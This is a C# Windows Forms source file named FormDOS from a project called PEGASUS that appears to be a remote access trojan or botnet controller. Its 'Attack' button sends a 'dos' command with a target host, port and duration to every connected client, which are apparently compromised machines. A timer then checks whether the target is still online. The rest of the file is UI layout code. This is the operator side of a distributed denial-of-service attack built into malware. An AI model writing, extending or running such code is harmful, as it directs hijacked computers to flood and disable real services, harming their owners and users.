using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using PEGASUS.Connection;
using PEGASUS.MessagePack;

namespace PEGASUS.Forms
	{
public class FormDOS : Form
{
	private TimeSpan timespan;

	private Stopwatch stopwatch;

	private string status = "is online";

	public object sync = new object();

	public List<Clients> selectedClients = new List<Clients>();

	public List<Clients> PlguinClients = new List<Clients>();

	private IContainer components;

	private Label label2;

	private Label label1;

	private Label label4;

	private Label label3;

	private System.Windows.Forms.Timer timer1;

	private System.Windows.Forms.Timer timer2;

	private Guna2GradientButton btnStop;

	private Guna2GradientButton btnAttack;

	private Guna2PictureBox guna2PictureBox1;

	private Guna2TextBox txtHost;

	private Guna2TextBox txtPort;

	private Guna2TextBox txtTimeout;

	private Guna2Panel guna2Panel1;

	private Label label5;

	private PictureBox pictureBox1;

	private Guna2Separator guna2Separator1;

	private Guna2BorderlessForm guna2BorderlessForm1;

	private Guna2ShadowForm guna2ShadowForm1;

	public FormDOS()
	{
		InitializeComponent();
	}

	private void BtnAttack_Click(object sender, EventArgs e)
	{
		if (string.IsNullOrWhiteSpace(txtHost.Text) || string.IsNullOrWhiteSpace(txtPort.Text) || string.IsNullOrWhiteSpace(txtTimeout.Text))
		{
			return;
		}
		try
		{
			if (!txtHost.Text.ToLower().StartsWith("http://"))
			{
				txtHost.Text = "http://" + txtHost.Text;
			}
			new Uri(txtHost.Text);
		}
		catch
		{
			return;
		}
		if (PlguinClients.Count <= 0)
		{
			return;
		}
		try
		{
			btnAttack.Enabled = false;
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "dos";
			msgPack.ForcePathObject("Option").AsString = "postStart";
			msgPack.ForcePathObject("Host").AsString = txtHost.Text;
			msgPack.ForcePathObject("Port").AsString = txtPort.Text;
			msgPack.ForcePathObject("Timeout").AsString = txtTimeout.Text;
			foreach (Clients plguinClient in PlguinClients)
			{
				selectedClients.Add(plguinClient);
				ThreadPool.QueueUserWorkItem(plguinClient.Send, msgPack.Encode2Bytes());
			}
			btnStop.Enabled = true;
			timespan = TimeSpan.FromSeconds(Convert.ToInt32(txtTimeout.Text) * 60);
			stopwatch = new Stopwatch();
			stopwatch.Start();
			timer1.Start();
			timer2.Start();
		}
		catch
		{
		}
	}

	private void BtnStop_Click(object sender, EventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "dos";
			msgPack.ForcePathObject("Option").AsString = "postStop";
			foreach (Clients plguinClient in PlguinClients)
			{
				ThreadPool.QueueUserWorkItem(plguinClient.Send, msgPack.Encode2Bytes());
			}
			selectedClients.Clear();
			btnAttack.Enabled = true;
			btnStop.Enabled = false;
			timer1.Stop();
			timer2.Stop();
			status = "is online";
		}
		catch
		{
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		Text = $"DOS ATTACK:{timespan.Subtract(TimeSpan.FromSeconds(stopwatch.Elapsed.Seconds))}    Status:host {status}";
		if (timespan < stopwatch.Elapsed)
		{
			btnAttack.Enabled = true;
			btnStop.Enabled = false;
			timer1.Stop();
			timer2.Stop();
			status = "is online";
		}
	}

	private void Timer2_Tick(object sender, EventArgs e)
	{
		try
		{
			WebRequest.Create(new Uri(txtHost.Text)).GetResponse().Dispose();
			status = "is online";
		}
		catch
		{
			status = "is offline";
		}
	}

	private void FormDOS_FormClosing(object sender, FormClosingEventArgs e)
	{
		try
		{
			foreach (Clients plguinClient in PlguinClients)
			{
				plguinClient.Disconnected();
			}
			PlguinClients.Clear();
			selectedClients.Clear();
		}
		catch
		{
		}
		Hide();
		base.Parent = null;
		e.Cancel = true;
	}

	private void guna2PictureBox1_Click(object sender, EventArgs e)
	{
		Close();
	}

	[DllImport("user32.DLL")]
	private static extern void ReleaseCapture();

	[DllImport("user32.DLL")]
	private static extern void SendMessage(IntPtr hwnd, int wmsg, int wparam, int lparam);

	private void guna2Panel1_MouseDown(object sender, MouseEventArgs e)
	{
		ReleaseCapture();
		SendMessage(base.Handle, 274, 61458, 0);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(FormDOS));
		label2 = new System.Windows.Forms.Label();
		label1 = new System.Windows.Forms.Label();
		label4 = new System.Windows.Forms.Label();
		label3 = new System.Windows.Forms.Label();
		timer1 = new System.Windows.Forms.Timer(components);
		timer2 = new System.Windows.Forms.Timer(components);
		btnStop = new Guna.UI2.WinForms.Guna2GradientButton();
		btnAttack = new Guna.UI2.WinForms.Guna2GradientButton();
		guna2PictureBox1 = new Guna.UI2.WinForms.Guna2PictureBox();
		txtHost = new Guna.UI2.WinForms.Guna2TextBox();
		txtPort = new Guna.UI2.WinForms.Guna2TextBox();
		txtTimeout = new Guna.UI2.WinForms.Guna2TextBox();
		guna2Panel1 = new Guna.UI2.WinForms.Guna2Panel();
		guna2Separator1 = new Guna.UI2.WinForms.Guna2Separator();
		pictureBox1 = new System.Windows.Forms.PictureBox();
		label5 = new System.Windows.Forms.Label();
		guna2BorderlessForm1 = new Guna.UI2.WinForms.Guna2BorderlessForm(components);
		guna2ShadowForm1 = new Guna.UI2.WinForms.Guna2ShadowForm(components);
		((System.ComponentModel.ISupportInitialize)guna2PictureBox1).BeginInit();
		guna2Panel1.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)pictureBox1).BeginInit();
		SuspendLayout();
		label2.AutoSize = true;
		label2.Location = new System.Drawing.Point(159, 143);
		label2.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		label2.Name = "label2";
		label2.Size = new System.Drawing.Size(40, 13);
		label2.TabIndex = 2;
		label2.Text = "PORT:";
		label1.AutoSize = true;
		label1.Location = new System.Drawing.Point(159, 114);
		label1.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		label1.Name = "label1";
		label1.Size = new System.Drawing.Size(40, 13);
		label1.TabIndex = 2;
		label1.Text = "HOST:";
		label4.AutoSize = true;
		label4.Location = new System.Drawing.Point(366, 172);
		label4.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		label4.Name = "label4";
		label4.Size = new System.Drawing.Size(26, 13);
		label4.TabIndex = 5;
		label4.Text = "min.";
		label3.AutoSize = true;
		label3.Location = new System.Drawing.Point(159, 172);
		label3.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		label3.Name = "label3";
		label3.Size = new System.Drawing.Size(48, 13);
		label3.TabIndex = 4;
		label3.Text = "Timeout:";
		timer1.Interval = 1000;
		timer1.Tick += new System.EventHandler(Timer1_Tick);
		timer2.Interval = 5000;
		timer2.Tick += new System.EventHandler(Timer2_Tick);
		btnStop.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
		btnStop.BorderThickness = 1;
		btnStop.CheckedState.Parent = btnStop;
		btnStop.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
		btnStop.CustomImages.Parent = btnStop;
		btnStop.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
		btnStop.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
		btnStop.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
		btnStop.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
		btnStop.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
		btnStop.DisabledState.Parent = btnStop;
		btnStop.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		btnStop.FillColor2 = System.Drawing.Color.FromArgb(36, 36, 36);
		btnStop.Font = new System.Drawing.Font("Electrolize", 9f);
		btnStop.ForeColor = System.Drawing.Color.White;
		btnStop.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
		btnStop.HoverState.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
		btnStop.HoverState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
		btnStop.HoverState.ForeColor = System.Drawing.Color.LightGray;
		btnStop.HoverState.Parent = btnStop;
		btnStop.Location = new System.Drawing.Point(315, 258);
		btnStop.Name = "btnStop";
		btnStop.ShadowDecoration.Parent = btnStop;
		btnStop.Size = new System.Drawing.Size(244, 30);
		btnStop.TabIndex = 9;
		btnStop.Text = "Stop";
		btnAttack.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
		btnAttack.BorderThickness = 1;
		btnAttack.CheckedState.Parent = btnAttack;
		btnAttack.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
		btnAttack.CustomImages.Parent = btnAttack;
		btnAttack.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
		btnAttack.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
		btnAttack.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
		btnAttack.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
		btnAttack.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
		btnAttack.DisabledState.Parent = btnAttack;
		btnAttack.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		btnAttack.FillColor2 = System.Drawing.Color.FromArgb(36, 36, 36);
		btnAttack.Font = new System.Drawing.Font("Electrolize", 9f);
		btnAttack.ForeColor = System.Drawing.Color.White;
		btnAttack.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
		btnAttack.HoverState.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
		btnAttack.HoverState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
		btnAttack.HoverState.ForeColor = System.Drawing.Color.LightGray;
		btnAttack.HoverState.Parent = btnAttack;
		btnAttack.Location = new System.Drawing.Point(65, 258);
		btnAttack.Name = "btnAttack";
		btnAttack.ShadowDecoration.Parent = btnAttack;
		btnAttack.Size = new System.Drawing.Size(244, 30);
		btnAttack.TabIndex = 10;
		btnAttack.Text = "Attack";
		guna2PictureBox1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
		guna2PictureBox1.BackColor = System.Drawing.Color.Transparent;
		guna2PictureBox1.Image = (System.Drawing.Image)resources.GetObject("guna2PictureBox1.Image");
		guna2PictureBox1.ImageRotate = 0f;
		guna2PictureBox1.Location = new System.Drawing.Point(591, 12);
		guna2PictureBox1.Name = "guna2PictureBox1";
		guna2PictureBox1.ShadowDecoration.Parent = guna2PictureBox1;
		guna2PictureBox1.Size = new System.Drawing.Size(29, 27);
		guna2PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		guna2PictureBox1.TabIndex = 11;
		guna2PictureBox1.TabStop = false;
		guna2PictureBox1.UseTransparentBackground = true;
		guna2PictureBox1.Click += new System.EventHandler(guna2PictureBox1_Click);
		txtHost.Animated = true;
		txtHost.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
		txtHost.Cursor = System.Windows.Forms.Cursors.IBeam;
		txtHost.DefaultText = "";
		txtHost.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
		txtHost.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
		txtHost.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		txtHost.DisabledState.Parent = txtHost;
		txtHost.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		txtHost.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		txtHost.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		txtHost.FocusedState.Parent = txtHost;
		txtHost.Font = new System.Drawing.Font("Electrolize", 9f);
		txtHost.ForeColor = System.Drawing.Color.White;
		txtHost.HoverState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		txtHost.HoverState.Parent = txtHost;
		txtHost.Location = new System.Drawing.Point(226, 112);
		txtHost.Name = "txtHost";
		txtHost.PasswordChar = '\0';
		txtHost.PlaceholderText = "";
		txtHost.SelectedText = "";
		txtHost.ShadowDecoration.Parent = txtHost;
		txtHost.Size = new System.Drawing.Size(244, 20);
		txtHost.TabIndex = 12;
		txtPort.Animated = true;
		txtPort.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
		txtPort.Cursor = System.Windows.Forms.Cursors.IBeam;
		txtPort.DefaultText = "80";
		txtPort.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
		txtPort.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
		txtPort.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		txtPort.DisabledState.Parent = txtPort;
		txtPort.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		txtPort.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		txtPort.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		txtPort.FocusedState.Parent = txtPort;
		txtPort.Font = new System.Drawing.Font("Electrolize", 9f);
		txtPort.ForeColor = System.Drawing.Color.White;
		txtPort.HoverState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		txtPort.HoverState.Parent = txtPort;
		txtPort.Location = new System.Drawing.Point(226, 139);
		txtPort.Name = "txtPort";
		txtPort.PasswordChar = '\0';
		txtPort.PlaceholderText = "";
		txtPort.SelectedText = "";
		txtPort.SelectionStart = 2;
		txtPort.ShadowDecoration.Parent = txtPort;
		txtPort.Size = new System.Drawing.Size(135, 20);
		txtPort.TabIndex = 13;
		txtTimeout.Animated = true;
		txtTimeout.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
		txtTimeout.Cursor = System.Windows.Forms.Cursors.IBeam;
		txtTimeout.DefaultText = "5";
		txtTimeout.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
		txtTimeout.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
		txtTimeout.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		txtTimeout.DisabledState.Parent = txtTimeout;
		txtTimeout.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		txtTimeout.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		txtTimeout.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		txtTimeout.FocusedState.Parent = txtTimeout;
		txtTimeout.Font = new System.Drawing.Font("Electrolize", 9f);
		txtTimeout.ForeColor = System.Drawing.Color.White;
		txtTimeout.HoverState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		txtTimeout.HoverState.Parent = txtTimeout;
		txtTimeout.Location = new System.Drawing.Point(226, 166);
		txtTimeout.Name = "txtTimeout";
		txtTimeout.PasswordChar = '\0';
		txtTimeout.PlaceholderText = "";
		txtTimeout.SelectedText = "";
		txtTimeout.SelectionStart = 1;
		txtTimeout.ShadowDecoration.Parent = txtTimeout;
		txtTimeout.Size = new System.Drawing.Size(135, 20);
		txtTimeout.TabIndex = 14;
		guna2Panel1.Controls.Add(guna2Separator1);
		guna2Panel1.Controls.Add(pictureBox1);
		guna2Panel1.Controls.Add(label5);
		guna2Panel1.Dock = System.Windows.Forms.DockStyle.Top;
		guna2Panel1.Location = new System.Drawing.Point(0, 0);
		guna2Panel1.Name = "guna2Panel1";
		guna2Panel1.ShadowDecoration.Parent = guna2Panel1;
		guna2Panel1.Size = new System.Drawing.Size(632, 67);
		guna2Panel1.TabIndex = 15;
		guna2Panel1.MouseDown += new System.Windows.Forms.MouseEventHandler(guna2Panel1_MouseDown);
		guna2Separator1.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		guna2Separator1.BackColor = System.Drawing.Color.Transparent;
		guna2Separator1.FillColor = System.Drawing.Color.FromArgb(36, 36, 36);
		guna2Separator1.Location = new System.Drawing.Point(-333, 61);
		guna2Separator1.Name = "guna2Separator1";
		guna2Separator1.Size = new System.Drawing.Size(1299, 10);
		guna2Separator1.TabIndex = 13;
		guna2Separator1.UseTransparentBackground = true;
		pictureBox1.Image = (System.Drawing.Image)resources.GetObject("pictureBox1.Image");
		pictureBox1.Location = new System.Drawing.Point(12, 12);
		pictureBox1.Name = "pictureBox1";
		pictureBox1.Size = new System.Drawing.Size(40, 42);
		pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		pictureBox1.TabIndex = 12;
		pictureBox1.TabStop = false;
		label5.AutoSize = true;
		label5.Font = new System.Drawing.Font("Electrolize", 12f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		label5.Location = new System.Drawing.Point(280, 24);
		label5.Name = "label5";
		label5.Size = new System.Drawing.Size(45, 19);
		label5.TabIndex = 11;
		label5.Text = "DOS";
		guna2BorderlessForm1.ContainerControl = this;
		guna2BorderlessForm1.ShadowColor = System.Drawing.Color.FromArgb(191, 37, 33);
		guna2ShadowForm1.ShadowColor = System.Drawing.Color.FromArgb(191, 37, 33);
		guna2ShadowForm1.TargetForm = this;
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
		base.ClientSize = new System.Drawing.Size(632, 322);
		base.Controls.Add(txtTimeout);
		base.Controls.Add(txtPort);
		base.Controls.Add(label4);
		base.Controls.Add(label3);
		base.Controls.Add(label2);
		base.Controls.Add(txtHost);
		base.Controls.Add(label1);
		base.Controls.Add(guna2PictureBox1);
		base.Controls.Add(btnAttack);
		base.Controls.Add(btnStop);
		base.Controls.Add(guna2Panel1);
		ForeColor = System.Drawing.Color.LightGray;
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
		base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
		base.Margin = new System.Windows.Forms.Padding(2);
		base.Name = "FormDOS";
		base.StartPosition = System.Windows.Forms.FormStartPosition.CenterParent;
		Text = "DDOS";
		base.FormClosing += new System.Windows.Forms.FormClosingEventHandler(FormDOS_FormClosing);
		((System.ComponentModel.ISupportInitialize)guna2PictureBox1).EndInit();
		guna2Panel1.ResumeLayout(false);
		guna2Panel1.PerformLayout();
		((System.ComponentModel.ISupportInitialize)pictureBox1).EndInit();
		ResumeLayout(false);
		PerformLayout();
	}
}
}